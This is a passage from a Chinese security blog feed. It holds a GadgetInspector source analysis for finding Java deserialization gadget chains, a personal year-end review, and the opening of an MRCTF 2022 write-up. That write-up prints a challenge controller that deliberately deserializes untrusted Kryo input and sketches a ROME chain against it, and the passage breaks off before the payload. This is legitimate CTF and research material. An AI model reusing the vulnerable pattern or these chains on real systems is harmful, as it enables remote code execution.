class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//方法信息</span></span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line"></span><br><span class="line">        InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line">        <span class="comment">//得到方法的所有子类方法实现</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations(</span><br><span class="line">                inheritanceMap, methodMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> ImplementationFinder implementationFinder = config.getImplementationFinder(</span><br><span class="line">                methodMap, methodImplMap, inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//写入文件</span></span><br><span class="line">        <span class="keyword">try</span> (Writer writer = Files.newBufferedWriter(Paths.get(<span class="string">&quot;methodimpl.dat&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123;</span><br><span class="line">                writer.write(entry.getKey().getClassReference().getName());</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(entry.getKey().getName());</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(entry.getKey().getDesc());</span><br><span class="line">                writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (MethodReference.Handle method : entry.getValue()) &#123;</span><br><span class="line">                    writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                    writer.write(method.getClassReference().getName());</span><br><span class="line">                    writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                    writer.write(method.getName());</span><br><span class="line">                    writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                    writer.write(method.getDesc());</span><br><span class="line">                    writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//方法调用map，key为父方法，value为子方法与父方法参数传递关系</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (GraphCall graphCall : DataLoader.loadData(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>), <span class="keyword">new</span> GraphCall.Factory())) &#123;</span><br><span class="line">            MethodReference.Handle caller = graphCall.getCallerMethod();</span><br><span class="line">            <span class="keyword">if</span> (!graphCallMap.containsKey(caller)) &#123;</span><br><span class="line">                Set&lt;GraphCall&gt; graphCalls = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">                graphCalls.add(graphCall);</span><br><span class="line">                graphCallMap.put(caller, graphCalls);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                graphCallMap.get(caller).add(graphCall);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//exploredMethods保存在调用链从查找过程中已经访问过的方法节点，methodsToExplore保存调用链</span></span><br><span class="line">        Set&lt;GadgetChainLink&gt; exploredMethods = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        LinkedList&lt;GadgetChain&gt; methodsToExplore = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Source source : DataLoader.loadData(Paths.get(<span class="string">&quot;sources.dat&quot;</span>), <span class="keyword">new</span> Source.Factory())) &#123;</span><br><span class="line">            GadgetChainLink srcLink = <span class="keyword">new</span> GadgetChainLink(source.getSourceMethod(), source.getTaintedArgIndex());</span><br><span class="line">            <span class="keyword">if</span> (exploredMethods.contains(srcLink)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            methodsToExplore.add(<span class="keyword">new</span> GadgetChain(Arrays.asList(srcLink)));</span><br><span class="line">            exploredMethods.add(srcLink);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> iteration = <span class="number">0</span>;</span><br><span class="line">        Set&lt;GadgetChain&gt; discoveredGadgets = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="comment">//使用广度优先搜索所有从source到sink的调用链</span></span><br><span class="line">        <span class="keyword">while</span> (methodsToExplore.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((iteration % <span class="number">1000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                LOGGER.info(<span class="string">&quot;Iteration &quot;</span> + iteration + <span class="string">&quot;, Search space: &quot;</span> + methodsToExplore.size());</span><br><span class="line">            &#125;</span><br><span class="line">            iteration += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            GadgetChain chain = methodsToExplore.pop();</span><br><span class="line">            GadgetChainLink lastLink = chain.links.get(chain.links.size()-<span class="number">1</span>);</span><br><span class="line">            <span class="comment">//获取当前节点方法所有子方法与当前节点方法参数传递关系</span></span><br><span class="line">            Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method);</span><br><span class="line">            <span class="keyword">if</span> (methodCalls != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (GraphCall graphCall : methodCalls) &#123;</span><br><span class="line">                    <span class="comment">//如果当前节点方法的污染参数与当前子方法受父方法参数影响的Index不一致则跳过</span></span><br><span class="line">                    <span class="keyword">if</span> (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod());</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> (MethodReference.Handle methodImpl : allImpls) &#123;</span><br><span class="line">                        GadgetChainLink newLink = <span class="keyword">new</span> GadgetChainLink(methodImpl, graphCall.getTargetArgIndex());</span><br><span class="line">                        <span class="comment">//如果新方法已近被访问过了，则跳过,这里能减少开销。但是这一步跳过会使其他链/分支链经过此节点时，由于已经此节点被访问过了，链会在这里断掉。那么如果这个条件去掉就能实现找到所有链了吗？这里去掉会遇到环状问题，造成路径无限增加</span></span><br><span class="line">                        <span class="keyword">if</span> (exploredMethods.contains(newLink)) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//新节点与之前的链组成新链</span></span><br><span class="line">                        GadgetChain newChain = <span class="keyword">new</span> GadgetChain(chain, newLink);</span><br><span class="line">                        <span class="comment">//如果到达了sink，则加入discoveredGadgets</span></span><br><span class="line">                        <span class="keyword">if</span> (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123;</span><br><span class="line">                            discoveredGadgets.add(newChain);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            methodsToExplore.add(newChain);</span><br><span class="line">                            exploredMethods.add(newLink);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (OutputStream outputStream = Files.newOutputStream(Paths.get(<span class="string">&quot;gadget-chains.txt&quot;</span>));</span><br><span class="line">             Writer writer = <span class="keyword">new</span> OutputStreamWriter(outputStream, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">            <span class="keyword">for</span> (GadgetChain chain : discoveredGadgets) &#123;</span><br><span class="line">                printGadgetChain(writer, chain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Paths.get(<span class="string">&quot;gadget-chains.txt&quot;</span>));</span><br><span class="line">        LOGGER.info(<span class="string">&quot;Found &#123;&#125; gadget chains.&quot;</span>, discoveredGadgets.size());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>到这里GI的关键逻辑也走完了难点部分也结束了</p><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><h3 id="关于dup指令"><a href="#关于dup指令" class="headerlink" title="关于dup指令"></a>关于dup指令</h3><p>这里我非常好奇java虚拟机里的dup指令的作用，看官方描述是复制栈顶数值并将复制值压入栈顶，很懵逼，但看了<a href="https://www.jb51.net/article/126349.htm">脚本之家的例子</a>后就完全明白了</p><p>对于类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExceptionTest</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">cantBeZero</span><span class="params">(<span class="keyword">int</span> i)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到字节码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0: iload_1</span><br><span class="line">1: ifne     12</span><br><span class="line">4: new      #2         </span><br><span class="line">// class java/lang/Exception</span><br><span class="line">7: dup</span><br><span class="line">8: invokespecial #3         </span><br><span class="line">// Method java/lang/Exception.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">11: athrow</span><br><span class="line">12: return</span><br></pre></td></tr></table></figure><ol><li><p>其中new指令在java堆上为Exception对象分配内存空间，并将地址压入操作数栈顶；</p></li><li><p>然后dup指令为复制操作数栈顶值，并将其压入栈顶，也就是说此时操作数栈上有连续相同的两个对象地址；</p></li><li><p>invokespecial指令调用实例初始化方法<init>:()V，注意这个方法是一个实例方法，所以需要从操作数栈顶弹出一个this引用，也就是说这一步会弹出一个之前入栈的对象地址；</init></p></li><li><p>athrow指令从操作数栈顶取出一个引用类型的值，并抛出；</p></li><li><p>最后由return指令结束方法</p></li></ol><p>从上面的五个步骤中可以看出，需要从栈顶弹出两个实例对象的引用，这就是为什么会在new指令下面有一个dup指令</p><h3 id="关于CC"><a href="#关于CC" class="headerlink" title="关于CC"></a>关于CC</h3><p>​    在简单了解完逻辑之后，打算试一试扫描cc组件，但是没有出现任何的结果，于是就做了一些简单的修改，在<code>gadgetinspector.GadgetChainDiscovery#isSink</code>我增加了一条规则直接将<code>org.apache.commons.collections.Transformer#transform</code> 作为 sink </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;org/apache/commons/collections/Transformer&quot;</span>)</span><br><span class="line">    &amp;&amp; method.getName().equals(<span class="string">&quot;transform&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是之后发现比如像AnnotationInvocationHandler这样的链，由于LazyMap在之前可能被添加到exploredMethods当中，导致利用链断了，后面自己尝试了下修复bug通过设置记录最大重复分支，但是发现重复利用链太多了，还是顶哦，还好发现了某个大师傅的宝藏仓库，里面对重复以及重复链做了聚合优化</p><p><a href="https://github.com/5wimming/gadgetinspector/blob/main/src/main/java/gadgetinspector/GadgetChainDiscovery.java">https://github.com/5wimming/gadgetinspector/blob/main/src/main/java/gadgetinspector/GadgetChainDiscovery.java</a></p><p>看了思路后尝试自己修改，最终出来的结果这样看起来更直观666<img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/25.png"></p><p>之后还有其他问题比如像cc当中的有PriorityQueue的链子，由于下面这串代码也会受影响</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//如果当前节点方法的污染参数与当前子方法受父方法参数影响的Index不一致则跳过</span></span><br><span class="line"><span class="keyword">if</span> (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex ) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>暂时的解决方案就是注释掉这一行来获得所有利用链，但是就是太慢了，而且人工审计工作量更大</p><p>总之GI真的太笨重了，这里主要是学习原理也不想深入改bug了</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/7058">https://xz.aliyun.com/t/7058</a></p><p><a href="https://cloud.tencent.com/developer/article/1633445">https://cloud.tencent.com/developer/article/1633445</a></p><p><a href="https://www.cnblogs.com/tr1ple/p/12800859.html">https://www.cnblogs.com/tr1ple/p/12800859.html</a></p><p><a href="https://www.jianshu.com/p/dfdfdb455d8c">https://www.jianshu.com/p/dfdfdb455d8c</a></p><p><a href="https://xz.aliyun.com/t/7058">https://xz.aliyun.com/t/7058</a></p><p><a href="https://paper.seebug.org/1034/">https://paper.seebug.org/1034/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 自动化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写给自己的2022年终总结</title>
      <link href="/2022/05/05/year/2022/5/%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9A%842021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
      <url>/2022/05/05/year/2022/5/%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9A%842021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="写给自己的2021年终总结"><a href="#写给自己的2021年终总结" class="headerlink" title="写给自己的2021年终总结"></a>写给自己的2021年终总结</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>​    想了想还是给自己写一个2021年的年终总结，回顾下过去一年所做的事情，复盘下自己的不足、待改进项。也便于未来时不时回来看看过去的我都在想一些什么。本来打算2022年年初写一篇的，可惜太懒了加上当时也忙着打比赛还有偶尔准备下实习面试的准备就一直没写，拖到了现在。疫情期间，有舍有得，且行且珍惜。主要是技术相关的吧，一些生活方面的不是很想在网上公开呢。</p><h2 id="回忆"><a href="#回忆" class="headerlink" title="回忆"></a>回忆</h2><h3 id="2021年"><a href="#2021年" class="headerlink" title="2021年"></a>2021年</h3><p>​    这段时间还是比较迷茫，不知道该干什么，特别是刚刚一月的时候，特别是想着每次打比赛都没有输出很难受(从20年九月进战队那时还是刚刚入门没多久，前两个月比赛题最多做出来了一道题很难受自闭了一段时间，再加上疫情我一个人在学校，最自闭的时候好几天都开心不起来)，也记不清了</p><p>​    也恰好在一月，成为我一个重要的人生转折点，在一月和我的朋友们一起参加了几个小比赛，有CTFSHOW的DJBCTF，这也是我第一个AK的比赛，这次比赛后我也重拾了很多信心(真的刷题学习半年了，很难受这一次比赛算是对我最大的安慰了)，在这个月也是我和我的小可爱相识的日子，还记得和你分享我比赛的那天，被小可爱表扬很开心(虽然那时候还没有在一起，但有你和我分享快乐)</p><p>​    二月也应该AK了两个比赛？不太记得清了，SXCCTF和四叶草网络安全学院牛年CTF大赛都是第一名虽然都是小比赛，但慢慢给了我信心，也为我之后AK道路埋下了伏笔吧，这个月没什么特别的</p><p>​    三月中V&amp;NCTF2021个人赛拿了Web单方向第五名其实是并列第一，只是有一个题稍微做的慢点了，这时候似乎慢慢开始被安全圈子的小伙伴慢慢知晓了，后面还参加了NepCTF2021拿了个第四，当然这个月最重要的事就是和我的小可爱确定了关系</p><p><img src="/2022/05/05/year/2022/5/%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9A%842021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png"></p><p>之后三月，入手了第一台Mini90，可惜后来吃灰了，不过也是拍了很多好看的照片啦</p><p><img src="/2022/05/05/year/2022/5/%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9A%842021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/2.png"></p><p>接下来的时间里4-6月，又开始迷茫了感觉光打CTF不行呢，于是开始接触了一些实际的东西，开始挖CMS的洞，记得第一个提交的是ThinkPHP3下的变量覆盖的RCE，之后在三个月陆陆续续交了一百多个洞吧，有前台的也有后台的主要是RCE，期间也打了一些比赛，这里也不多说了，不是很大，之前三月前记录比赛名称主要是真的对当时的我意义重大</p><p>​    在这期间还参加了国赛(可惜一些原因放弃了去线下的机会)，同时还有最重要的强网杯，也是这次比赛让我接触了内网渗透的一些东西，当然线上的一些题也被我做出来了差不多又ak了吧，当然线下比较惨，也是吃了渗透的亏，渗透只打了第一层，不过还是水了个全国三等奖还是不错滴，同时这段时间里还认识了很多CTF圈子里厉害的大佬，后面还有个强网杯自动化渗透的赛道被学长带飞拿了个第二，还是有点后悔，其实差一点点就第一了，真的就差那一点</p><p>​    之后的后半年当中，也打了一些比赛基本上一两月一次的频次吧，也是拿了很多奖，之后大概就是在开始学习Java了吧，在这期间也建立了一个小仓库,一直都在更新，更多是记录自己的学习过程</p><p><img src="/2022/05/05/year/2022/5/%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9A%842021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/3.png"></p><p>年底的时候，体验了两次面试，刚开始面试比较紧张很多都说不出来虽然都知道也都做过，不过后来也过了一个长亭的实习，可惜由于疫情开学会封校也去不了了，有点小可惜</p><h3 id="2022年-4月"><a href="#2022年-4月" class="headerlink" title="2022年-4月"></a>2022年-4月</h3><p> 还是简简单单写下关于2022吧，不会很认真写，不然年底还写啥勒，莫名其妙加了很多星球都是白嫖，也认识了很多人，特别是漂亮鼠主管人也很有趣(每天不学习就会被骂)</p><p>在2022年初参加了个阿里云的webshell检测挑战，那时候还是一窍不通开始搞jsp最后混了个🥉自己觉得还行，奖牌也挺好看的</p><p><img src="/2022/05/05/year/2022/5/%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9A%842021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/4.png"></p><p>之后就是准备等3月各个公司hc开了投简历，陆续投了俩先是投了一个白帽汇安全研究方向，虽然过了但是我第一次实习工作还是想去大厂试试，之后就是阿里云了，很幸运最后被徐师收留了，中间的小插曲也很有趣反复催hr进度，后面由于到处都锁hc了本以为没戏了，没想到最后还是发了</p><p><img src="/2022/05/05/year/2022/5/%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9A%842021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/5.png"></p><p>最近因为一些原因也退了很多群(比赛群+安全学习群)，包括我之前一直很喜欢的赛博群，主要还是觉得自从加了群以后日渐浮躁(可能还是疫情的原因吧，大家都挺不容易的)，我喜欢的技术性话题也越来越少了，另外我也比较容易受周围的气氛影响，因此也打算暂时退出群好好静一段时间再打算吧。</p><p>索性经过五一的调休这两天慢慢恢复了过来没那么浮躁了，也要继续开始之后的冒险了！</p><p>当然如果让我说从2020到2021我学会了什么，大概是慢慢学会了接受自己的不足，减少了社交欲望，慢慢专注于自己热爱的东西吧。</p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022MRCTF-Java部分</title>
      <link href="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/"/>
      <url>/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2022MRCTF-Java部分"><a href="#2022MRCTF-Java部分" class="headerlink" title="2022MRCTF-Java部分"></a>2022MRCTF-Java部分</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说是一次非常不错的比赛，这里也会简单列出考点方便查阅学习，不难有点引导性质</p><p>Ps：此次比赛都是不出网，所以都需要内存马，内存马部分不做讲解很简单百度搜搜</p><p>下面这两题挺不错的也学到了东西，题目做了备份，核心代码(exp)也放到了git仓库备份，本篇只是思路帖子</p><p><a href="https://github.com/Y4tacker/CTFBackup/tree/main/2022/2022MRCTF">https://github.com/Y4tacker/CTFBackup/tree/main/2022/2022MRCTF</a></p><p>Springcoffee–Kryo反序列化、绕Rasp</p><p>EzJava–绕Serialkiller黑名单中cc关键组件</p><p>下面这两题没啥参考价值，不过让我搞了下实战也还不错</p><p>Java_mem_shell_Filter–log4j2打jndi</p><p>Java_mem_shell_Basic—tomcat弱口令</p><h2 id="Springcoffee-–-Kryo反序列化、绕Rasp"><a href="#Springcoffee-–-Kryo反序列化、绕Rasp" class="headerlink" title="Springcoffee – Kryo反序列化、绕Rasp"></a>Springcoffee – Kryo反序列化、绕Rasp</h2><p>ok，这东西也是从来没学过，又是从头开始，这里记录了当时是如何思考的分析思考过程</p><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>首先看看整体目录结构</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/7.png"></p><p>这里挑几个重要的来讲一下<code>CoffeeController</code></p><p>order路由反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/coffee/order&quot;&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Message <span class="title">order</span><span class="params">(<span class="meta">@RequestBody</span> CoffeeRequest coffee)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (coffee.extraFlavor != <span class="keyword">null</span>) &#123;</span><br><span class="line">    ByteArrayInputStream bas = <span class="keyword">new</span> ByteArrayInputStream(Base64.getDecoder().decode(coffee.extraFlavor));</span><br><span class="line">    Input input = <span class="keyword">new</span> Input(bas);</span><br><span class="line">    ExtraFlavor flavor = (ExtraFlavor)<span class="keyword">this</span>.kryo.readClassAndObject(input);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Message(<span class="number">200</span>, flavor.getName());</span><br></pre></td></tr></table></figure><p>demo路由，主要是根据输入修改一些关键配置，这个比较关键之后再说</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/coffee/demo&quot;&#125;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Message <span class="title">demoFlavor</span><span class="params">(<span class="meta">@RequestBody</span> String raw)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(raw);</span><br><span class="line">        JSONObject serializeConfig = <span class="keyword">new</span> JSONObject(raw);</span><br><span class="line">        <span class="keyword">if</span> (serializeConfig.has(<span class="string">&quot;polish&quot;</span>) &amp;&amp; serializeConfig.getBoolean(<span class="string">&quot;polish&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.kryo = <span class="keyword">new</span> Kryo();</span><br><span class="line">            Method[] var3 = <span class="keyword">this</span>.kryo.getClass().getDeclaredMethods();</span><br><span class="line">            <span class="keyword">int</span> var4 = var3.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var5 = <span class="number">0</span>; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">                Method setMethod = var3[var5];</span><br><span class="line">                <span class="keyword">if</span> (setMethod.getName().startsWith(<span class="string">&quot;set&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Object p1 = serializeConfig.get(setMethod.getName().substring(<span class="number">3</span>));</span><br><span class="line">                        <span class="keyword">if</span> (!setMethod.getParameterTypes()[<span class="number">0</span>].isPrimitive()) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                p1 = Class.forName((String)p1).newInstance();</span><br><span class="line">                                setMethod.invoke(<span class="keyword">this</span>.kryo, p1);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">                                var9.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            setMethod.invoke(<span class="keyword">this</span>.kryo, p1);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        Output output = <span class="keyword">new</span> Output(bos);</span><br><span class="line">        <span class="keyword">this</span>.kryo.register(Mocha.class);</span><br><span class="line">        <span class="keyword">this</span>.kryo.writeClassAndObject(output, <span class="keyword">new</span> Mocha());</span><br><span class="line">        output.flush();</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Message(<span class="number">200</span>, <span class="string">&quot;Mocha!&quot;</span>, Base64.getEncoder().encode(bos.toByteArray()));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先要解决这道题，我们得知道前人都有一些什么研究</p><p>通过谷歌简单搜索可以搜到一篇文章：<a href="https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/">浅析Dubbo Kryo/FST反序列化漏洞（CVE-2021-25641）</a></p><p>其中比较有信息量的是调用栈，但是这里题目环境里面没有依赖</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/8.png"></p><p>但是这里有rome依赖，那么很容易想到EqualsBean去触发ROME的利用链子</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/9.png"></p><h3 id="具体利用过程-Payload构造过程"><a href="#具体利用过程-Payload构造过程" class="headerlink" title="具体利用过程(Payload构造过程)"></a>具体利用过程(Payload构造过程)</h3><p>根据dubbo的利用链进行修改我们可以得到这样的代码</p><figure class="highlight java"><table><tr><td 